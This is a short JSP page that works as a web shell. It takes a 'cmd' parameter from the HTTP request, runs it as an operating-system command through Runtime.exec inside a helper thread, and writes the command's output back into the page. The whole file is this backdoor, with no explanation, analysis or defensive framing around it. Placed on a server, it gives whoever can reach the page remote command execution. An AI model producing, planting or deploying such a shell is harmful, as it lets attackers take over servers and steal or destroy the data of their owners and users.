<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.util.concurrent.atomic.AtomicReference" %>
<%!
    public static InputStream exec(String cmd) throws Exception {
        final String cmdd = cmd;
        final AtomicReference<InputStream> inputStreamRef = new AtomicReference<>();
        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    InputStream inputStream = Runtime.getRuntime().exec(cmdd).getInputStream();
                    inputStreamRef.set(inputStream);
                } catch (Exception e) {
                    // Handle the exception
                }
            }
        });
        thread.start();
        thread.join();

        return inputStreamRef.get();
    }

    public static String scanner(InputStream inputStream) {
        return new Scanner(inputStream).useDelimiter("\\A").next();
    }
%>

<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        out.println(scanner(exec(cmd)));
    }
%>